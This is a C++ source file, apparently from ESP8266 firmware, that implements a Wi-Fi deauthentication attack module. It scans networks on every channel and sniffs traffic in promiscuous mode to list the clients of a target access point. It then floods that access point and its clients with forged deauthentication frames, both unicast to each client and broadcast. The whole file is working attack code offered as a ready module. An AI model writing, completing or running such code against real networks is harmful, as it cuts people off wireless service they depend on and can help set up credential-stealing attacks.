#include "deauth.h"
#include "config.h"

extern "C" {
    #include "user_interface.h"
}

extern String logBuffer;
extern void addLog(const String& msg);

DeauthModule::DeauthModule() {
    running = false;
    targetCount = 0;
    framesSent = 0;
    lastScan = 0;
    activeTarget = "";
    clientCount = 0;
    memset(clientMACs, 0, sizeof(clientMACs));
}

void DeauthModule::begin() {
    addLog("[DEAUTH] Modulo iniciado");
}

void DeauthModule::scanTargets() {
    if (millis() - lastScan < 5000) return;
    lastScan = millis();
    
    int n = WiFi.scanNetworks();
    targetCount = 0;
    
    for (int i = 0; i < n && targetCount < MAX_DEAUTH_TARGETS; i++) {
        targets[targetCount].ssid = WiFi.SSID(i);
        targets[targetCount].bssid = WiFi.BSSIDstr(i);
        targets[targetCount].channel = WiFi.channel(i);
        targets[targetCount].rssi = WiFi.RSSI(i);
        targets[targetCount].clientCount = 0;
        targetCount++;
    }
    
    WiFi.scanDelete();
    addLog("[DEAUTH] Escaneo completado: " + String(targetCount) + " redes");
}

void DeauthModule::scanAllChannels() {
    targetCount = 0;
    
    for (int ch = 1; ch <= 13; ch++) {
        wifi_set_channel(ch);
        delay(100); // Esperar a que el cambio de canal surta efecto
        
        int n = WiFi.scanNetworks();
        for (int i = 0; i < n && targetCount < MAX_DEAUTH_TARGETS; i++) {
            // Verificar si ya existe esta red
            bool exists = false;
            for (int j = 0; j < targetCount; j++) {
                if (targets[j].bssid == WiFi.BSSIDstr(i)) {
                    exists = true;
                    break;
                }
            }
            
            if (!exists) {
                targets[targetCount].ssid = WiFi.SSID(i);
                targets[targetCount].bssid = WiFi.BSSIDstr(i);
                targets[targetCount].channel = WiFi.channel(i);
                targets[targetCount].rssi = WiFi.RSSI(i);
                targets[targetCount].clientCount = 0;
                targetCount++;
            }
        }
        WiFi.scanDelete();
    }
    
    // Volver al canal del AP
    wifi_set_channel(AP_CHANNEL);
    addLog("[DEAUTH] Escaneo multi-canal completado: " + String(targetCount) + " redes");
}

void DeauthModule::startAttack(const String& bssid, int channel) {
    if (running) return;

    targetBSSID = bssid;
    targetChannel = channel;
    running = true;
    framesSent = 0;
    activeTarget = bssid;
    clientCount = 0;

    // Switch to target channel
    wifi_set_channel(targetChannel);

    // Brief passive scan to detect clients associated to this BSSID
    scanClients(800);

    addLog("[DEAUTH] Ataque iniciado contra " + bssid + " canal " + String(channel)
           + " (" + String(clientCount) + " clientes detectados)");
}

void DeauthModule::stopAttack() {
    running = false;
    activeTarget = "";
    addLog("[DEAUTH] Ataque detenido. Frames enviados: " + String(framesSent));
}

void DeauthModule::update() {
    if (!running || targetBSSID.length() == 0) return;

    unsigned long now = millis();
    static unsigned long lastDeauth = 0;

    if (now - lastDeauth >= 100) {
        uint8_t bssid[6];
        if (!parseBSSID(targetBSSID, bssid)) return;

        if (clientCount > 0) {
            // Unicast deauth to each known client
            for (int i = 0; i < clientCount; i++) {
                sendDeauthFrame(bssid, clientMACs[i]);   // AP -> Client
                // Also send in reverse direction: Client -> AP
                sendDeauthFrame(clientMACs[i], bssid);
            }
        }

        // Always also send broadcast for undiscovered clients
        uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        sendDeauthFrame(bssid, broadcast);

        lastDeauth = now;
    }
}

bool DeauthModule::isRunning() {
    return running;
}

String DeauthModule::getActiveTarget() {
    return activeTarget;
}

unsigned long DeauthModule::getFramesSent() {
    return framesSent;
}

int DeauthModule::getTargetCount() {
    return targetCount;
}

int DeauthModule::getTargetChannel() {
    return targetChannel;
}

int DeauthModule::getClientCount() {
    return clientCount;
}

bool DeauthModule::parseBSSID(const String& bssidStr, uint8_t* out) {
    int n = sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    return n == 6;
}

// ---------------------------------------------------------------------------
// Client detection via promiscuous mode
// Captures data frames whose BSSID matches the target and extracts client MACs
// ---------------------------------------------------------------------------

struct DeauthSniffCtx {
    uint8_t targetBSSID[6];
    uint8_t clientMACs[MAX_DEAUTH_CLIENTS][6];
    int clientCount;
};

static DeauthSniffCtx _sniffCtx;

static void IRAM_ATTR deauthSniffCb(uint8_t* buf, uint16_t len) {
    // RxControl is 36 bytes; after that is the 802.11 frame.
    // Data frames have FC[0] = 0x08 (Data) or 0x88 (QoS Data)
    // For data frames: DS bits in FC[1] indicate direction:
    //   ToDS=1 FromDS=0 (0x01): STA -> AP: BSSID=DA[4..9], SA=SA[10..15]
    //   ToDS=0 FromDS=1 (0x02): AP -> STA: BSSID=SA[4..9], SA=DA[10..15] (client=DA)
    if (len < 60) return;

    uint8_t fc0 = buf[36];
    uint8_t fc1 = buf[37];

    // Only data frames (type=0x02, subtype=0x00 or 0x08)
    if ((fc0 & 0x0C) != 0x08) return;

    uint8_t ds = fc1 & 0x03;
    uint8_t* bssid = nullptr;
    uint8_t* client = nullptr;

    if (ds == 0x01) {
        // ToDS: bssid=buf[40..45], client=buf[46..51]
        bssid  = &buf[40];
        client = &buf[46];
    } else if (ds == 0x02) {
        // FromDS: bssid=buf[46..51], client=buf[40..45]
        bssid  = &buf[46];
        client = &buf[40];
    } else {
        return;
    }

    // Check BSSID matches target
    if (memcmp(bssid, _sniffCtx.targetBSSID, 6) != 0) return;

    // Skip multicast/broadcast clients
    if (client[0] & 0x01) return;

    // Check if client already recorded
    for (int i = 0; i < _sniffCtx.clientCount; i++) {
        if (memcmp(_sniffCtx.clientMACs[i], client, 6) == 0) return;
    }

    if (_sniffCtx.clientCount < MAX_DEAUTH_CLIENTS) {
        memcpy(_sniffCtx.clientMACs[_sniffCtx.clientCount++], client, 6);
    }
}

void DeauthModule::scanClients(uint16_t windowMs) {
    uint8_t bssid[6];
    if (!parseBSSID(targetBSSID, bssid)) return;

    memcpy(_sniffCtx.targetBSSID, bssid, 6);
    _sniffCtx.clientCount = 0;

    wifi_set_promiscuous_rx_cb(deauthSniffCb);
    wifi_promiscuous_enable(1);
    delay(windowMs);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(nullptr);

    // Copy detected clients to module
    clientCount = _sniffCtx.clientCount;
    for (int i = 0; i < clientCount; i++) {
        memcpy(clientMACs[i], _sniffCtx.clientMACs[i], 6);
    }

    if (clientCount > 0) {
        addLog("[DEAUTH] Clientes detectados: " + String(clientCount));
    }
}

String DeauthModule::getTargetsJSON() {
    String json = "[";
    for (int i = 0; i < targetCount; i++) {
        if (i > 0) json += ",";
        json += "{";
        json += "\"ssid\":\"" + targets[i].ssid + "\",";
        json += "\"bssid\":\"" + targets[i].bssid + "\",";
        json += "\"channel\":" + String(targets[i].channel) + ",";
        json += "\"rssi\":" + String(targets[i].rssi) + ",";
        json += "\"clients\":" + String(targets[i].clientCount);
        json += "}";
    }
    json += "]";
    return json;
}

void DeauthModule::sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
    uint8_t packet[26];
    packet[0] = 0xC0;
    packet[1] = 0x00;
    packet[2] = 0x00;
    packet[3] = 0x00;
    memcpy(&packet[4], clientMac, 6);
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);
    packet[22] = 0x00;
    packet[23] = 0x00;
    packet[24] = 0x07;
    packet[25] = 0x00;
    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
    framesSent++;
}

void DeauthModule::parseScanResult() {
}
